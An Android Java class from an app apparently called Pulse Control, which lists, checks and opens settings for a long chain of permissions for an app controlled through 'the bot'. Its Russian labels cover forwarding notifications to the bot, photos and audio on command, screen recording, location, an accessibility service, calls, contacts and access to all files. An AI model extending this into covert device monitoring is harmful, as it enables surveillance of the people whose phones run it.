package com.pulse.control;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;

import java.util.ArrayList;
import java.util.List;

/** One-tap permission catalogue, shared by the UI onboarding and the bot. */
public final class Perms {

    public static final class Step {
        public final String title;
        public final String desc;
        public final String action; // a11y, notif, camera, mic, geo, overlay, battery, usage, screenshot, boot, none
        public Step(String title, String desc, String action) {
            this.title = title; this.desc = desc; this.action = action;
        }
    }

    private Perms() {}

    public static boolean isA11yOn(Context c) {
        try {
            String flat = Settings.Secure.getString(c.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (flat == null) return false;
            for (String s : flat.split(":")) {
                if (s.toLowerCase().startsWith(c.getPackageName().toLowerCase() + "/")) return true;
            }
            return false;
        } catch (Exception e) { return false; }
    }

    public static boolean granted(Context c, String perm) {
        return c.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean overlay(Context c) {
        return Settings.canDrawOverlays(c);
    }

    public static boolean battery(Context c) {
        try {
            PowerManager pm = (PowerManager) c.getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(c.getPackageName());
        } catch (Exception e) { return false; }
    }

    public static boolean allFiles(Context c) {
        try {
            if (Build.VERSION.SDK_INT >= 30) return android.os.Environment.isExternalStorageManager();
            return granted(c, Manifest.permission.READ_EXTERNAL_STORAGE);
        } catch (Exception e) { return false; }
    }

    public static boolean dndOk(Context c) {
        try {
            if (Build.VERSION.SDK_INT >= 23) {
                android.app.NotificationManager nm = (android.app.NotificationManager)
                        c.getSystemService(Context.NOTIFICATION_SERVICE);
                return nm != null && nm.isNotificationPolicyAccessGranted();
            }
            return true;
        } catch (Exception e) { return false; }
    }

    public static boolean usage(Context c) {
        try {
            android.app.AppOpsManager ops = (android.app.AppOpsManager) c.getSystemService(Context.APP_OPS_SERVICE);
            int mode = ops.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), c.getPackageName());
            return mode == android.app.AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) { return false; }
    }

    /** Ordered permission wizard (what one "grant everything" tap walks through). */
    public static final String[] WIZARD = {
            "notif", "camera", "mic", "geo", "overlay", "battery", "notify", "usage", "a11y"
    };

    public static List<Step> steps(Context c) {
        List<Step> s = new ArrayList<>();
        s.add(new Step("Служба доступа", "Скриншоты, Домой, тапы", isA11yOn(c) ? "done" : "a11y"));
        s.add(new Step("Уведомления", "Карточка статуса", granted(c, Manifest.permission.POST_NOTIFICATIONS) ? "done" : "notif"));
        s.add(new Step("Доступ к уведомлениям", "Пересылка сообщений в бот", NotifyHook.connected ? "done" : "notify"));
        s.add(new Step("Камера", "Фото по команде", granted(c, Manifest.permission.CAMERA) ? "done" : "camera"));
        s.add(new Step("Микрофон", "Голосовая запись", granted(c, Manifest.permission.RECORD_AUDIO) ? "done" : "mic"));
        s.add(new Step("Геолокация", "Найти телефон на карте",
                (granted(c, Manifest.permission.ACCESS_FINE_LOCATION) ? "done" : "geo")));
        s.add(new Step("Поверх окон", "Камера/фонарик из фона", overlay(c) ? "done" : "overlay"));
        s.add(new Step("Батарея", "Не засыпать в фоне", battery(c) ? "done" : "battery"));
        s.add(new Step("Статистика", "«Что открыто сейчас»", usage(c) ? "done" : "usage"));
        s.add(new Step("Запись экрана", "Видео/трансляция экрана", Config.projValid(c) ? "done" : "screenshot"));
        s.add(new Step("Звонки и SMS", "Позвонить, сбросить звонок",
                granted(c, Manifest.permission.CALL_PHONE) ? "done" : "call"));
        s.add(new Step("Контакты", "Поиск по имени", granted(c, Manifest.permission.READ_CONTACTS) ? "done" : "contacts"));
        s.add(new Step("Все файлы", "Файловый менеджер, обои", allFiles(c) ? "done" : "allfiles"));
        s.add(new Step("Не беспокоить", "Тихий режим", dndOk(c) ? "done" : "dnd"));
        return s;
    }

    public static String stepLabel(Step s) {
        String mark;
        if ("done".equals(s.action)) mark = "✅";
        else mark = "⬜";
        if ("a11y".equals(s.action)) mark = "⬜";
        return mark + " " + s.title;
    }

    public static void openSettings(Context c, String action) {
        try {
            switch (action) {
                case "a11y":
                    c.startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "camera":
                case "mic":
                case "geo":
                    if (c instanceof Activity) break;
                    c.startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.parse("package:" + c.getPackageName()))
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "overlay":
                    c.startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + c.getPackageName()))
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "battery":
                    try {
                        c.startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                Uri.parse("package:" + c.getPackageName()))
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    } catch (Exception e) {
                        c.startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    }
                    break;
                case "usage":
                    c.startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "allfiles":
                    if (Build.VERSION.SDK_INT >= 30) {
                        c.startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                                Uri.parse("package:" + c.getPackageName()))
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    } else {
                        c.startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                Uri.parse("package:" + c.getPackageName()))
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    }
                    break;
                case "dnd":
                    c.startActivity(new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "call":
                case "contacts":
                    if (c instanceof Activity) break;
                    c.startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.parse("package:" + c.getPackageName()))
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "screenshot":
                    try { ScreenCapActivity.request(c, "record", 15); } catch (Exception ignored) {}
                    break;
                case "notify":
                    c.startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                default:
                    break;
            }
        } catch (Exception ignored) {}
    }
}
